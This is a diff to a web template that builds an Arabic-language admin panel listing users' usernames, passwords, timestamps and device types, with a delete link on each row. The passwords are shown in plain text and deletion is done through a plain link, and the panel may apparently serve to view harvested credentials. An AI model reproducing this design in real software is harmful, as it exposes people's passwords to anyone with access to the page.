@@ -1,10 +1,19 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Title</title>
-</head>
-<body>
-
-</body>
-</html>
+<h2>لوحة تحكم الإدمن</h2>
+<table>
+    <tr>
+        <th>اسم المستخدم</th>
+        <th>كلمة السر</th>
+        <th>توقيت التسجيل</th>
+        <th>نوع الجهاز</th>
+        <th>إجراء</th>
+    </tr>
+    {% for user in users %}
+    <tr>
+        <td>{{ user.username }}</td>
+        <td>{{ user.password }}</td>
+        <td>{{ user.timestamp }}</td>
+        <td>{{ user.device }}</td>
+        <td><a href="/delete_user/{{ loop.index0 }}">حذف</a></td>
+    </tr>
+    {% endfor %}
+</table>
